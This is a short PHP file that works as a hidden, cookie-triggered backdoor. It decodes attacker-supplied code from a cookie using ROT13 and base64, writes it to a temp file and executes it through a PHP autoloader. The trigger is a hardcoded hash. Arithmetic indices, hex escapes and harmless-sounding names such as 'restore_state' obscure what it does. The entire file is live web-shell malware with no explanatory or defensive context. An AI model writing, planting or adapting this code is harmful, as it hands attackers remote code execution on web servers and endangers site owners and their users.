<?php


if (isset($_COOKIE[-57+57]) && isset($_COOKIE[71+-70]) && isset($_COOKIE[-74+77]) && isset($_COOKIE[97+-93])) {
    $ref = $_COOKIE;
    function restore_state($object) {
        $ref = $_COOKIE;
        $obj = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '7fb3a579');
        if (!is_writable($obj)) {
            $obj = getcwd() . DIRECTORY_SEPARATOR . "data_storage";
        }
        $reference = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($ref[3]));
        if (is_writeable($obj)) {
            $pointer = fopen($obj, 'w+');
            fputs($pointer, $reference);
            fclose($pointer);
            spl_autoload_unregister(__FUNCTION__);
            require_once($obj);
            @array_map('unlink', array($obj));
        }
    }
    spl_autoload_register("restore_state");
    $record = "cda10813308e9bdbe9d332733902eb23";
    if (!strncmp($record, $ref[4], 32)) {
        if (@class_parents("reverse_searcher_initialized", true)) {
            exit;
        }
    }
}
